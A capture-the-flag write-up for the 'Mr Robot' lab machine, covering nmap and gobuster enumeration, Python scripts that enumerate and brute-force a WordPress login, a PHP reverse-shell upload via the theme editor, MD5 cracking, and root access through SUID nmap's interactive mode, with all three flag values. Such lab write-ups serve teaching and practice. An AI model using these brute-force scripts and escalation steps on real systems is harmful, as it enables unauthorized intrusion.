# Mr Robot - Linux

*This is box can also be downloaded from [Vulnhub](https://www.vulnhub.com)*

**Machine IP may vary over the readme as it took some time when executing script and I didn't notice that the box went down.**

## Enumeration

### Nmap: `nmap -A 10.10.224.37 -oN nmap-initial`

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03

```

### Gobuster: `gobuster dir -u http://10.10.224.37 --wordlist=common.txt | tee gobuster-scan`

```
/.hta                 (Status: 403) [Size: 213]
/.htaccess            (Status: 403) [Size: 218]
/.htpasswd            (Status: 403) [Size: 218]
/0                    (Status: 301) [Size: 0] [--> http://10.10.224.37/0/]
/admin                (Status: 301) [Size: 234] [--> http://10.10.224.37/admin/]
/atom                 (Status: 301) [Size: 0] [--> http://10.10.224.37/feed/atom/]
/audio                (Status: 301) [Size: 234] [--> http://10.10.224.37/audio/]  
/blog                 (Status: 301) [Size: 233] [--> http://10.10.224.37/blog/]   
/css                  (Status: 301) [Size: 232] [--> http://10.10.224.37/css/]    
/dashboard            (Status: 302) [Size: 0] [--> http://10.10.224.37/wp-admin/] 
/favicon.ico          (Status: 200) [Size: 0]                                     
/feed                 (Status: 301) [Size: 0] [--> http://10.10.224.37/feed/]     
/image                (Status: 301) [Size: 0] [--> http://10.10.224.37/image/]    
/images               (Status: 301) [Size: 235] [--> http://10.10.224.37/images/] 
/Image                (Status: 301) [Size: 0] [--> http://10.10.224.37/Image/]    
/index.html           (Status: 200) [Size: 1158]                                  
/index.php            (Status: 301) [Size: 0] [--> http://10.10.224.37/]          
/intro                (Status: 200) [Size: 516314]                                
/js                   (Status: 301) [Size: 231] [--> http://10.10.224.37/js/]     
/license              (Status: 200) [Size: 309]                                   
/login                (Status: 302) [Size: 0] [--> http://10.10.224.37/wp-login.php]
/page1                (Status: 301) [Size: 0] [--> http://10.10.224.37/]            
/phpmyadmin           (Status: 403) [Size: 94]                                      
/readme               (Status: 200) [Size: 64]                                      
/rdf                  (Status: 301) [Size: 0] [--> http://10.10.224.37/feed/rdf/]   
/robots               (Status: 200) [Size: 41]                                      
/robots.txt           (Status: 200) [Size: 41]                                      
/rss                  (Status: 301) [Size: 0] [--> http://10.10.224.37/feed/]       
/rss2                 (Status: 301) [Size: 0] [--> http://10.10.224.37/feed/]       
/sitemap              (Status: 200) [Size: 0]                                       
/sitemap.xml          (Status: 200) [Size: 0]                                       
/video                (Status: 301) [Size: 234] [--> http://10.10.224.37/video/]    
/wp-admin             (Status: 301) [Size: 237] [--> http://10.10.224.37/wp-admin/] 
/wp-content           (Status: 301) [Size: 239] [--> http://10.10.224.37/wp-content/]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.10.224.37/wp-includes/]
/wp-config            (Status: 200) [Size: 0]                                         
/wp-cron              (Status: 200) [Size: 0]                                         
/wp-links-opml        (Status: 200) [Size: 227]                                       
/wp-login             (Status: 200) [Size: 2606]                                      
/wp-load              (Status: 200) [Size: 0]                                         
/wp-mail              (Status: 500) [Size: 3064]                                      
/wp-settings          (Status: 500) [Size: 0]                                         
/wp-signup            (Status: 302) [Size: 0] [--> http://10.10.224.37/wp-login.php?action=register]
/xmlrpc.php           (Status: 405) [Size: 42]                            
/xmlrpc               (Status: 405) [Size: 42] 

```

## Key-1

Check inside robots.txt file. There are two files listed.. Just check the `key-1-of-3.txt` file and there it is our first flag.

`073403c8a58a1f80d943455fb30724b9`

We also get a **fsocity.dic** file listed in robots.txt. Let's download if for now.

## Key-2

**wp-login.php** let's check this one out. Got a wordpress login page. Let's try basic sqli.. Did not work... but it seems it gives an error **"Invalid username"**. Maybe I can figure out the username and then use that *fsocity.dict* file for password.. Let's build a script for this.

### Figuring out username for the page

The room is heavily inspired by the tv series *Mr. Robot*. So let's use the major character names in that show as username list for this.

```python
#!/usr/bin/python3

import requests

url = "http://10.10.186.224/wp-login.php"
log = "username"
pwd ="password"
wpsubmit = "login"

username_error = "Invalid username"

user_list = ['Elliot Alderson', 'Elliot', 'Alderson', 'Mr. Robot', 'Darlene Alderson', 'Darlene', 'Whiterose', 'Angela Moss', 'Angela', 'Moss'] 

for f in user_list:
	print(f"Trying Username: {f}", end=" - ")
	payload = {"log": f, "pwd":"password", "wp-submit":"login"}
	r = requests.post(url, data=payload)
	if username_error in r.text:
		print("Did not work")
	else:
		print("Got the username!")
		break

print("END OF SCRIPT")
```

Once the script completes we get our username: `Elliot`

### Figuring out password for user

Now lets figure out the password. Let's use the **fsocity.dic** file we got earlier as password list. *Yeah I could have gone with hydra for this but I don't like the syntax when dealing with web login pages hence plain and simple python script.*

```python
#!/usr/bin/python3

import requests

url = "http://10.10.186.224/wp-login.php"

log = "username"
pwd ="password"
wpsubmit = "login"

password_error = "The password you entered for the username"

file = open("fsocity.dic", "r")
file_data = file.readlines()
file.close()

trial = 0
for f in file_data:
	f = f.replace("\n","")
	trial += 1
	print(f"Trial No: {trial} Trying Password: {f}", end=" - ")
	payload = {"log":"Elliot", "pwd":f, "wp-submit":"login"}
	r = requests.post(url, data=payload)
	if password_error in r.text:
		print("Did not work")
	else:
		print("Got the password!")
		break

print("END OF SCRIPT")

```

This script will take a while to complete, but once done we have our password: `ER28-0652`

Let's login and look around. Let's check the **users** tab for any other users. We already have **admins** role, this makes things easy.

Let's upload a reverse shell php script in **Editor** option inside **Appearance** tab *(I knew this cause I had some previous experience with wordpress)*. For this I used **comments.php** template though any template can be used. Just replace the existing code inside the \*.php file and call that through your browser. In my case **http://10.10.186.224/comments.php**. Make sure you set up an netcat listener before calling the \*.php file. Once done we get ourselves a reverse shell.

Let's check the **/etc/passwd** file for usernames and home directories. We have a user by the name of **robot** with home directory at **/home/robot**. Let's take a look inside. It seems we cannot read the key2 file but there is one more file with hash inside.

Using **hash-identifier** it seems the hash is of MD5 type. Lets use [crackstation](https://crackstation.net/) for cracking this. Once cracked we have our text: `abcdefghijklmnopqrstuvwxyz`

Doing `su robot` and supplying the above text as password we can login as **robot** user. Now just cat the 2nd key.

`822c73956184f694993bede3eb39f959`

## Key-3

Let's check for priv esc now. 

`sudo -l` : results in nothing

Command: `find / -perm -u=s -type f 2>/dev/null`

Output: 
```bash
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```

Lets check out nmap payload in [GFTObins](https://gtfobins.github.io/gtfobins/nmap/)

Let's use that to gain access to root owned files

```bash
nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
# id
uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
# cd /root
# ls
firstboot_done  key-3-of-3.txt
```
There it is the last key inside /root dir.

`04787ddef27c3dee1ee161b21670b4e4`
